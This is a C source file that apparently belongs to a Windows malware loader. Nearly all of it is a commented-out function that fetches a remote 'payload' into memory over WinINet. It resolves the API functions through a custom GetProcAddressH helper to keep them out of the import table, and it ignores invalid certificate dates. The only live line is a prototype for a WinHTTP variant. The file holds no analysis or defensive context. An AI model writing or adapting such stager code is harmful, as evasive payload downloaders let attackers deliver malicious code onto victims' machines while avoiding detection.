#include <Windows.h>

/*
BOOL Wininet(LPCSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
	HMODULE hWnet = LoadLibraryW(L"wininet.dll");

	typedef HINTERNET(WINAPI* dInternetOpenA)(IN LPCSTR lpszAgent, IN DWORD  dwAccessType, IN LPCSTR lpszProxy, IN LPCSTR lpszProxyBypass, IN DWORD  dwFlags);
	typedef HINTERNET(WINAPI* dInternetOpenUrlA)(IN HINTERNET hInternet, IN LPCSTR lpszUrl, IN LPCSTR lpszHeaders, IN DWORD dwHeadersLength, IN DWORD dwFlags, IN DWORD_PTR dwContext);
	typedef BOOL(WINAPI* dInternetReadFile)(IN HINTERNET hFile, IN LPVOID lpBuffer, IN DWORD dwNumberOfBytesToRead, IN LPDWORD lpdwNumberOfBytesRead);
	typedef BOOL(WINAPI* dInternetSetOptionA)(IN HINTERNET hInternet, IN DWORD dwOption, IN LPVOID lpBuffer, IN DWORD dwBufferLength);
	typedef BOOL(WINAPI* dInternetCloseHandle)(IN HINTERNET hInternet);

	dInternetOpenA pInternetOpenA = (dInternetOpenA)GetProcAddressH(hWnet, "InternetOpenA");
	dInternetOpenUrlA pInternetOpenUrlA = (dInternetOpenUrlA)GetProcAddressH(hWnet, "InternetOpenUrlA");
	dInternetReadFile pInternetReadFile = (dInternetReadFile)GetProcAddressH(hWnet, "InternetReadFile");
	dInternetSetOptionA pInternetSetOptionA = (dInternetSetOptionA)GetProcAddressH(hWnet, "InternetSetOptionA");
	dInternetCloseHandle pInternetCloseHandle = (dInternetCloseHandle)GetProcAddressH(hWnet, "InternetCloseHandle");

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T	   	 sSize = NULL;
	PBYTE		pBytes = NULL,
		pTmpBytes = NULL;


	hInternet = pInternetOpenA(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = pInternetOpenUrlA(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		CopyMemoryex((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		pInternetCloseHandle(hInternet);
	if (hInternetFile)
		pInternetCloseHandle(hInternetFile);
	if (hInternet)
		pInternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}
*/

BOOL Winhttp();
